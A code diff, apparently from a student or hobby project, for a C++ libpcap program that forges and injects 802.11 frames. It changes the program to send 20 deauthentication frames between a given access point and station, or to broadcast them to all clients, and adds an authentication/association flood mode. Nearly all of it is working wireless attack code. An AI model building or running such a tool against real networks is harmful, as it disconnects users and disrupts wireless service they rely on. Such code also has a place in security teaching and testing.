@@ -10,6 +10,10 @@
 #include <iomanip>
 #include "mac_address.h"
 
+#define DEAUTH 0x0b
+#define AUTH 0x0c
+#define AUSSO 0x00
+
 using namespace std;
 
 #pragma pack(push, 1)
@@ -112,15 +116,18 @@ int main(int argc, char* argv[]) {
         return -1;
     }
 
-    
-    uint8_t packet[256];
 
-    // 반복 전송
-    while (true) {
-        if (has_station_mac){
-            uint8_t packet2[256];
-            make_packet(packet, ap_mac, station_mac, deauth_or_auth ? 0x0b : 0x0c);
-            make_packet(packet2, station_mac, ap_mac, deauth_or_auth ? 0x0b : 0x0c);
+    if (has_station_mac){
+        uint8_t packet[256];
+        uint8_t packet2[256];
+        if (deauth_or_auth){//authentication attack
+            make_packet(packet, station_mac, ap_mac, AUTH);
+            make_packet(packet2, station_mac, ap_mac,  AUSSO);
+        } else { //deautentication attack
+            make_packet(packet, ap_mac, station_mac, DEAUTH);
+            make_packet(packet2, station_mac, ap_mac, DEAUTH);
+        }
+        for (int i=0;i< 20;i++){
             // 패킷 전송
             if (pcap_sendpacket(pcap, packet, sizeof(RadiotapHeader) + sizeof(Frame80211) + 12) != 0) {
                 fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(pcap));
@@ -130,16 +137,18 @@ int main(int argc, char* argv[]) {
                 fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(pcap));
             }
             usleep(10000); 
-        } else{
-            make_packet(packet, ap_mac, make_mac(0xff, 0xff, 0xff, 0xff, 0xff, 0xff), 0x0b );
-
-            // 패킷 전송
-            if (pcap_sendpacket(pcap, packet, sizeof(RadiotapHeader) + sizeof(Frame80211) + 12) != 0) {
-                fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(pcap));
-            }
-            usleep(10000); 
         }
+    } else {//Just Broadcast Deauth
+        uint8_t packet[256];
+        make_packet(packet, ap_mac, make_mac(0xff, 0xff, 0xff, 0xff, 0xff, 0xff), 0x0b );
+        for (int i=0;i< 20;i++){
+        // 패킷 전송
+        if (pcap_sendpacket(pcap, packet, sizeof(RadiotapHeader) + sizeof(Frame80211) + 12) != 0) {
+            fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(pcap));
+        }
+        usleep(10000); }
     }
+    pcap_close(pcap);
 
     return 0;
 }
